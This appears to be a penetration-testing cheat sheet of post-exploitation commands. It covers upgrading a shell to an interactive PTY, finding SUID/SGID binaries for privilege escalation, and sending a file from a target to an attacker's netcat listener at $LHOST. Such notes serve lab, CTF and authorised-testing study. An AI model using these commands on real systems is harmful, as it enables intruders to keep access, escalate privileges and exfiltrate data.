* Spawning a PTY without python, with only script inside the system-->
/usr/bin/script -qc /bin/bash /dev/null
export TERM=xterm-color

* Bingo! Upgrade: 
python -c 'import pty;pty.spawn("/bin/bash")'
export SHELL=bash 
and
export TERM=xterm-256color

* However this shell still wonâ€™t do what we want it to, so we need to get full tty for an interactive shell. 
First, enter this python command: 
python -c 'import pty; pty.spawn("/bin/bash")'            .Then, 
press CTRL+Z to put the shell in the background. 
Next, type this command in the same window: 
stty raw -echo;fg               
This will bring your shell back to the foreground with full interactive experience.


* This will list files that have SUID or SGID bits set -->
find / -type f -perm -04000 -ls 2>/dev/null 
Searches for SUID bit set binary files -->
find / -perm +6000 2>/dev/null | grep '/bin/'


* Transfering files through remote servers
sudo python -m SimpleHTTPServer 4444
Let download this file via netcat:
Local: nc -l -p 1234 > suspicious.pcapng
Target: nc -w 3 $LHOST 1234 < suspicious.pcapng
Check md5sum: md5sum suspicious.pcapng (if it matches you are good, if not do -w 5 on target netcat command)
